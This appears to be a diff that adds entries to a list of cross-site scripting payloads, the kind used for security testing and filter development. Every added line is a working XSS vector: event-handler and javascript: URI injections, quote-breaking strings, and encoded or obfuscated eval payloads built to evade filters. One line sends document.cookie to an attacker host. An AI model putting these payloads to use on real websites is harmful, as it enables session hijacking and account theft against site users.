@@ -8,3 +8,27 @@ javascript:alert(1)
 <video src=1 onerror=alert(1)>
 <audio src=1 onerror=alert(1)>
 "><svg/onload=prompt(1)>
+<math><mi//xlink:href="data:x,<script>alert(1)</script>">
+<form><button formaction="javascript:alert(1)">XSS</button>
+<frameset><frame src="javascript:alert(1)"></frameset>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<a href="javascript:alert(1)">Click Me</a>
+<details ontoggle=alert(1)>
+'-alert(1)-'
+"-alert(1)-"
+\";alert(1);//
+';alert(1);//
+<scRipt>alERt(1)</sCRipT>
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+<img src=1 onerror=eval("\x61\x6c\x65\x72\x74\x28\x31\x29")>
+javascript://%250Aalert(1)
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<iframe srcdoc="<script>alert(1)</script>">
+<a href="javascript:&apos;alert(1)&apos;">Click here</a>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<img src=x onerror=this.src='http://attacker.com/?c='+document.cookie>
+<math><x href="javascript:alert(1)">click
+<svg><script xlink:href=data:,alert(1) />
+<svg><use href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSkgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48L3N2Zz4=">
+`"-alert(1)-"`
